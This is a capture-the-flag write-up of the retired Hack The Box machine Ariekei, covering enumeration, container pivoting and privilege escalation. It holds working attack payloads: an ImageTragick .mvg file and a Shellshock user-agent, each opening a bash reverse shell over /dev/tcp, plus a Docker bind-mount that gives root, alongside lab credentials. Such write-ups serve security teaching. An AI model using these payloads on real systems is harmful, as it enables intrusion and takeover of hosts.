# Ariekei

This is the write-up for the box Ariekei that got retired at the 21st April 2018.
My IP address was 10.10.14.10 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.65    ariekei.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/ariekei.nmap 10.10.10.65
```

```markdown
PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a7:5b:ae:65:93:ce:fb:dd:f9:6a:7f:de:50:67:f6:ec (RSA)
|   256 64:2c:a6:5e:96:ca:fb:10:05:82:36:ba:f0:c9:92:ef (ECDSA)
|_  256 51:9f:87:64:be:99:35:2a:80:a6:a2:25:eb:e0:95:9f (ED25519)
443/tcp  open  ssl/https nginx/1.10.2
|_http-server-header: nginx/1.10.2
|_http-title: 400 The plain HTTP request was sent to HTTPS port
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|_  http/1.1
1022/tcp open  ssh       OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 98:33:f6:b6:4c:18:f5:80:66:85:47:0c:f6:b7:90:7e (DSA)
|   2048 78:40:0d:1c:79:a1:45:d4:28:75:35:36:ed:42:4f:2d (RSA)
|   256 45:a6:71:96:df:62:b5:54:66:6b:91:7b:74:6a:db:b7 (ECDSA)
|_  256 ad:8d:4d:69:8e:7a:fd:d8:cd:6e:c1:4f:6f:81:b4:1f (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Notes about the findings:
- There are two different **OpenSSH** versions on this box
  - Port 1022 has an older version
  - The 2048-bit RSA keys are different

## Checking HTTPS (Port 443)

On the web page it only says "Maintenance!" and that the "site is under development" and there is also nothing interesting in the HTML source code.
There is an interesting response header _"X-Ariekei-WAF: beehive.ariekei.htb"_ so the traffic goes through a **Web Application Firewall (WAF)**.

When checking the SSL certificate there are some subdomains that seem important:
```markdown
DNS Name: calvin.ariekei.htb
DNS Name: beehive.ariekei.htb
```

So putting those into the _/etc/hosts_ file and looking if they host different pages.
- beehive.ariekei.htb
  - Hosts the initial page
- calvin.ariekei.htb
  - Responses with an _HTTP 404 error_
  - The header _X-Ariekei-WAF_ is not shown

Lets search for hidden directories with **Gobuster** on the initial page:
```markdown
gobuster -u https://10.10.10.65 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -f -s "200,204,301,302,307,403" -t 50
```

It finds the directory _/blog_ which is a blog page that runs with **Bootstrap** but there is no PHP running and the site is completely static and can be ignored.

It also finds the directory _/cgi-bin/_ that responses with an _HTTP 403 Forbidden_ error.
> That directory can only be found, when searching for it with a trailing slash (/) symbol. This is what the `-f` parameter does.

Lets search for sub-directories in there:
```markdown
gobuster -u https://10.10.10.65/cgi-bin/ dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -s "200,204,301,302,307,403" -t 50
```

It finds _/stats_ file which shows the output of some system commands to give us information about date, system version and environment variables:
```markdown
Wed Jul 15 12:14:04 UTC 2020
12:14:04 up 44 min, 0 users, load average: 0.90, 0.41, 0.16
GNU bash, version 4.2.37(1)-release (x86_64-pc-linux-gnu) Copyright (C) 2011 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later  This is free software; you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law.
Environment Variables:

SERVER_SIGNATURE=
Apache/2.2.22 (Debian) Server at 10.10.10.65 Port 80

HTTP_USER_AGENT=Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
HTTP_X_FORWARDED_FOR=10.10.14.10
SERVER_PORT=80
HTTP_HOST=10.10.10.65
HTTP_X_REAL_IP=10.10.14.10
DOCUMENT_ROOT=/home/spanishdancer/content
SCRIPT_FILENAME=/usr/lib/cgi-bin/stats
REQUEST_URI=/cgi-bin/stats
SCRIPT_NAME=/cgi-bin/stats
HTTP_CONNECTION=close
REMOTE_PORT=56238
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PWD=/usr/lib/cgi-bin
SERVER_ADMIN=webmaster@localhost
HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
HTTP_DNT=1
HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
REMOTE_ADDR=172.24.0.1
SHLVL=1
SERVER_NAME=10.10.10.65
SERVER_SOFTWARE=Apache/2.2.22 (Debian)
QUERY_STRING=
SERVER_ADDR=172.24.0.2
GATEWAY_INTERFACE=CGI/1.1
HTTP_UPGRADE_INSECURE_REQUESTS=1
SERVER_PROTOCOL=HTTP/1.0
HTTP_ACCEPT_ENCODING=gzip, deflate, br
REQUEST_METHOD=GET
\_=/usr/bin/env
```

The GNU bash version 4.2.37 is vulnerable to **Shellshock**, but after trying to exploit that vulnerability, the web server responses with an ASCII emoji face, which is probably the **WAF** that blocks it.
By fuzzing the Shellshock string, it will still get blocked and we are stuck, so lets analyze the subdomain _calvin.ariekei.htb_ that doesn't seem to be protected by the WAF.

### Enumerating the Subdomain

Searching for hidden directories with **Gobuster** on the _calvin.ariekei.htb_:
```markdown
gobuster -u https://calvin.ariekei.htb dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -s "200,204,301,302,307,403" -t 50
```

It finds the directory _/upload_ where it is possible to upload images:

![Upload page](https://kyuu-ji.github.io/htb-write-up/ariekei/ariekei_web-1.png)

In the HTML source is a comment that is ASCII art of a happy mask face and a sad mask face also known as _"Tragedy Mask"_.
This is a hint for a vulnerability that is called [ImageTragick](https://imagetragick.com/).

To exploit this, it is needed to upload a _.mvg_ file with the example exploit code. The _fill parameter_ in the **ImageMagick** library is vulnerable and will lead to code execution. There is a [Blog post from Cloudflare](https://blog.cloudflare.com/inside-imagetragick-the-real-payloads-being-used-to-hack-websites-2/) with different payloads.

Creating _exploit.mvg_:
```markdown
push graphic-context
viewbox 0 0 640 480
fill 'url(https://"|setsid /bin/bash -i >& /dev/tcp/10.10.14.10/443 0<&1 2>&1")'
pqop graphic-context
```

After uploading it, the listener on my IP and port 443 starts a reverse shell session as _root_ on _calvin.ariekei.htb_.

## Enumerating the Network

In the root (/) directory is a file called _.dockerenv_ which indicates that this is a **Docker container** from which pivoting to other machines is necessary.
Commands like `netstat`, `ss`, `ip` and `arp` are not on this container, but network connections can also be seen in the file _/proc/net/tcp_:
```markdown
sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
   0: 0B00007F:A90C 00000000:0000 0A 00000000:00000000 00:00000000 00000000    0  0 18353 1 0000000000000000 100 0 0 10 0
   1: 00000000:1F90 00000000:0000 0A 00000000:00000001 00:00000000 00000000    0  0 18985 2 0000000000000000 100 0 0 10 0
   2: 0B0017AC:8B12 0A0E0A0A:01BB 01 00000002:00000000 01:0000001B 00000000    0  0 298817 3 0000000000000000 27 4 31 10 -1
   3: 0B0017AC:1F90 010017AC:A706 08 00000000:0000039F 00:00000000 00000000    0  0 0 1 0000000000000000 20 4 26 10 -1
   4: 0B0017AC:1F90 010017AC:A704 08 00000000:00000001 00:00000000 00000000    0  0 298813 1 0000000000000000 20 4 26 10 -1
```

After translating the addresses from hex to decimal, it shows IP addresses and ports:
```markdown
local_address         rem_address
127.0.0.11:43276      0.0.0.0:0
0.0.0.0:8080          0.0.0.0:0
172.23.0.11:35602     10.10.14.10:443
172.23.0.11:8080      172.23.0.11:42758
172.23.0.11:8080      172.23.0.11:42756
```

This information can also be found in _/proc/net/fib_trie_ and the **ARP** table is in this directory _/proc/net/arp_, too:
```markdown
IP address       HW type     Flags       HW address            Mask     Device
172.23.0.1       0x1         0x2         02:42:4b:da:58:b8     *        eth0
172.23.0.252     0x1         0x2         02:42:ac:17:00:fc     *        eth0
```

In the root (/) directory is also a non-default folder called _/common_. The subdirectory _/common/network_ has an image in it, which describes the network architecture:

![Network architecture](https://kyuu-ji.github.io/htb-write-up/ariekei/ariekei_network-1.png)

In there is a bash script that creates the networks:
```markdown
# Create isolated network for building containers. No internet access
docker network create -d bridge --subnet=172.24.0.0/24 --gateway=172.24.0.1 --ip-range=172.24.0.0/24 -o com.docker.network.bridge.enable_ip_masquerade=false arieka-test-net

# Crate network for live containers. Internet access
docker network create -d bridge --subnet=172.23.0.0/24 --gateway=172.23.0.1 --ip-range=172.23.0.0/24 arieka-live-net
```

The directory _/common/containers_ has the configuration files of the four containers:
- bastion-live
- blog-test
- convert-live
- waf-live

Right now this container is in the 172.23.0.0/24 network and the goal is to get into the 172.24.0.0/24 network and then to the host, but there is no direct route to it from here, so we need to pivot through the network.

### Pivoting to Bastion-live

There is another directory _/common/.secrets_ with a public and a private SSH key file _bastion_key_ and _bastion_key.pub_.
Lets try it on port 22 and 1022:
```markdown
ssh -i bastion_key -p 1022 10.10.10.65
```

It works on SSH on port 1022 and gives access to a box with two IP addresses _172.23.0.253_ and _172.24.0.253_, which means this is the bastion host. The hostname _ezra.ariekei.htb_ also proofs that.

### Pivoting to Blog-test

As this machines has a connection to the _172.24.0.2/24_ network, there is only one box that is in that network and it is _beehive.ariekei.htb (172.24.0.2)_.
When examining the **Apache** configuration files in _/common/containers/blog-test/config/sites-enabled/000-default_ it states that it listens on port 80:
```markdown
<VirtualHost \*:80>
(...)
```

As the **Web Application Firewall** is not in the way anymore, it is possible to exploit **Shellshock** to gain command execution:
```markdown
wget --user-agent='() { :; }; echo; echo; /usr/bin/whoami' 172.24.0.2/cgi-bin/stats
```

The _stats_ file outputs _"www-data"_ and command execution works. Instead of starting a reverse shell, lets use a SSH tunnel with the [SSH command line](https://www.sans.org/blog/using-the-ssh-konami-code-ssh-control-sequences/).

Getting into SSH command line on _ezra_ and forwarding my local port 8001:
```markdown
ssh> -L 8001:172.24.0.2:80
```

Open remote port 8002 on _ezra_ by forwarding through my localhost on port 8003:
```markdown
ssh> -R 8002:127.0.0.1:8003
```

Now on my local client I test it by connecting via `curl` to _blog-test (172.24.0.2)_ on port 8001:
```markdown
curl localhost:8001
```

This outputs the web page on _beehive.ariekei.htb_ where we know it is vulnerable to **Shellshock**, so exploiting that to start a reverse shell:
```markdown
curl -A '() { :; }; echo; echo; /bin/bash -i >& /dev/tcp/172.24.0.253/8002 0<&1 2>&1' http://localhost:8001/cgi-bin/stats
```

After sending the request, the listener on my IP and port 8003 starts a reverse shell session on _blog-test_ as _www-data_.

### Pivoting to Host

We are _www-data_ on this box but were root on all the other containers. When looking at the _/common/containers/*/Dockerfile_ in the configuration files, there is a root password in cleartext:
> root:Ib3!kTEvYw6*P7s

Lets switch user to root with `su -` to get access to all files.

There is the home directory _/home/spanishdancer_ that has a private and public SSH key in the _.ssh_ folder and the public key shows the username and hostname for which box it is:
```markdown
(...) spanishdancer@ariekei.htb
```

The private key is AES-128 encrypted and has to be cracked before and for that I will use **JohnTheRipper**:
```markdown
sshng2john spanishdancer_key > spanishdancer_key_crack

john spanishdancer_key_crack --wordlist=/usr/share/wordlists/rockyou.txt
```

After a while it gets cracked and the password for the SSH key is:
> purple1

```markdown
chmod 600 spanishdancer_key

ssh -i spanishdancer_key spanishdancer@10.10.10.65
```

It works and we are logged in on the host machine as _spanishdancer_.

## Privilege Escalation

We know that Docker is installed, so it is a good idea to check if it is possible to abuse misconfigurations in that.
The user _spanishdancer_ is a member of the Docker group as `groups` shows, so running Docker commands works:
```markdown
docker container ls
```
```markdown
CONTAINER ID        IMAGE               COMMAND                  PORTS                          NAMES
c362989563fd        convert-template    "/bin/sh -c 'pytho..."   8080/tcp                       convert-live
7786500c3e80        bastion-template    "/usr/sbin/sshd -D"      0.0.0.0:1022->22/tcp           bastion-live
e980d631b20e        waf-template        "/bin/sh -c 'nginx..."   80/tcp, 0.0.0.0:443->443/tcp   waf-live
d77fe9521405        web-template        "/usr/sbin/apache2..."   80/tcp                         blog-test
(...)
```

Bind mounting the local volume of the host on one of the containers to get access to the file system:
```markdown
docker run -v /:/tmp/testname -it convert-template bash
```

In the path _/tmp/testname_ inside of the container, the local file system is mounted and it is possible to read the root flag and do everything that root can do!
